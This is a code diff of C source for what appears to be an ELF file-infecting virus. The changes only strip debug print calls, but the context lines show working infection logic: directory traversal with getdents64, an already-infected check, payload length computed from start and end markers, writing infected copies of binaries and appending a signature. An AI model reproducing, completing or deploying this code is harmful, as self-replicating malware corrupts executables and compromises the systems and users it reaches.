@@ -41,7 +41,6 @@ struct linux_dirent64 {
  int infect(char path[],size_t path_length);
  void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry);
  void	ft_putnbr(long long nb);
- void		ft_putstr(char *s);
  int		ft_putchar(int c);
  int     ft_isdigit(int c);
  int ft_isallnum(char *str);
@@ -280,12 +279,7 @@ int	ft_putchar(int c)
 {
 	return (write(1, &c, 1));
 }// can be delete == debug
-void		ft_putstr(char *s)
-{
-	if (!s)
-		return ;
-	write(1, s, ft_strlen(s));
-}// can be delete == debug
+
 int     ft_isdigit(int c)
 {
 	if ((c >= '0') && (c <= '9'))
@@ -521,7 +515,6 @@ int main_encrypt()
 	//printf("content %s\n",path_env);
 	size_t path_length = ft_strlen(path_env);
 	size_t i = 0;
-	ft_putstr(path_maj);
 	int length_path =0;
 	do
 	{
@@ -656,7 +649,7 @@ int open_directory(char *path)
 	directory[9] =':';
 	directory[10] =' ';
 	directory[11] = 0;
-	ft_putstr(directory);
+
 	write(1,path,ft_strlen(path));
 	write(1,"\n",1);
 	//printf("directory: '%s'\n",path);
@@ -687,8 +680,7 @@ int open_directory(char *path)
 		fail[7] ='i';
 		fail[8] ='l';
 		fail[9] = 0;
-		ft_putstr(fail);
-		ft_putstr(path);
+
 		ft_putchar('\n');
 		//printf("open fail: '%s'\n",path);
 
@@ -709,8 +701,7 @@ int open_directory(char *path)
 
 	getd[10] ='\n';
 	getd[11] =0;
-	ft_putstr(getd);
-	ft_putstr(getd);
+
 	//printf("getdents64\n");
 	;
 	char name_nread[8];
@@ -745,8 +736,7 @@ int open_directory(char *path)
 			host[5] =':';
 			host[6] =0;
 
-			ft_putstr(host);
-			ft_putstr(d->d_name);
+
 			char type[7];
 			type[0] =' ';
 			type[1] ='t';
@@ -755,7 +745,7 @@ int open_directory(char *path)
 			type[4] ='e';
 			type[5] =' ';
 			type[6] =0;
-			ft_putstr(type);
+
 			ft_putnbr(d->d_type);
 			ft_putchar('\n');
 			//printf("host %s type %d\n",d->d_name, d->d_type);
@@ -766,9 +756,9 @@ int open_directory(char *path)
 			path_file[len] = '/';
 			ft_memmove(path_file + len + 1,d->d_name, ft_strlen(d->d_name));
 			path_file[len + 1 + ft_strlen(d->d_name)] = '\0';
-			ft_putstr(d->d_name);
+
 			ft_putchar(' ');
-			ft_putstr(path_file);
+
 			ft_putchar('\n');
 			//printf("%s %s\n",d->d_name,path_file);
 			struct stat st;
@@ -805,7 +795,7 @@ int do_the_job(char buff[],size_t size, char *path)
  	debut[15] ='b';
  	debut[16] ='\n';
  	debut[17] =0;
-	ft_putstr(debut);
+
 	//printf("debut do_the_job\n");
 
 	unsigned int payload_len = ((char *)&myend - (char *)&real_start ) + SIZE_BEFORE_ENTRY_POINT;
@@ -818,7 +808,7 @@ ft_putchar('\n');
 	ono[0] = '1';
 	ono[1]='\n';
 	ono[2]=0;
-	ft_putstr(ono);
+
 	ft_putnbr(size);
 	write(1, buff, 20);
 	ft_putchar('\n');
@@ -832,10 +822,6 @@ ft_putchar('\n');
 		ft_putchar('\n');
 		return (1);
 	}
-	ft_putchar('3');
-	ft_putchar('.');
-	ft_putchar('2');
-	ft_putchar('\n');
 
 
 	Elf64_Ehdr* hdr;
@@ -876,7 +862,6 @@ ft_putchar('\n');
 			deja[12] ='d';
 			deja[13] ='\n';
 			deja[14] =0;
-			ft_putstr(deja);
 			return (1);
 
 		}
@@ -914,7 +899,7 @@ ft_putchar('\n');
 	fin[2]='n';
 	fin[3]='\n';
 	fin[4]=0;
-	ft_putstr(fin);
+
 	return 0;
 }
 
@@ -1009,7 +994,7 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	ft_memmove(tmp,path,ft_strlen(path));
 	ft_memmove(only_name(tmp) + 1,only_name(tmp), ft_strlen(only_name(tmp)));
 	*only_name(tmp) = '.';
-	ft_putstr(tmp);
+
 	ft_putchar('\n');
 
 	if ((fd = open (tmp, 0x242, 0755)) < 0)
@@ -1021,7 +1006,7 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 		write(2,error,3);
 		return ;
 	}
-	ft_putstr(new_debut);
+
 	ft_putchar('\n');
 
 	ft_putnbr(end_of_text);
@@ -1276,7 +1261,7 @@ bool	is_infected2(char *data)
 	name_enter[13]='d';
 	name_enter[14]='\n';
 	name_enter[15]=0;
-	ft_putstr(name_enter);
+
 		while(sig[i])
 		{
 			ft_putnbr(i);
@@ -1301,7 +1286,7 @@ bool	is_infected2(char *data)
 				is_inf[15]=' ' ;
 				is_inf[16]='0';
 				is_inf[17]=0;
-				ft_putstr(is_inf);
+
 				return(0);
 
 			}
@@ -1315,7 +1300,7 @@ bool	is_infected2(char *data)
 	name_ret[4]='1';
 	name_ret[5]='\n';
 	name_ret[6]=0;
-	ft_putstr(name_ret);
+
 
 	return(1);
 }
@@ -1402,10 +1387,9 @@ size_t	put_sig(int fd)
 		name_new[6]='e';
 		name_new[7]='\n';
 		name_new[8]=0;
-		ft_putstr(name_new);
+
 		*(long long *)fingerprint = address_of_main - sizeof(long long);
 	}
-	ft_putstr(fingerprint);
 
 	i = 7;
 	while(i >= 0)
@@ -1422,7 +1406,6 @@ size_t	put_sig(int fd)
 		i--;
 	}
 	size = write(fd,sig, sizeof(sig));
-	ft_putstr(fingerprint);
 	size += write(fd,fingerprint, sizeof(fingerprint));
 	return (size);
 }
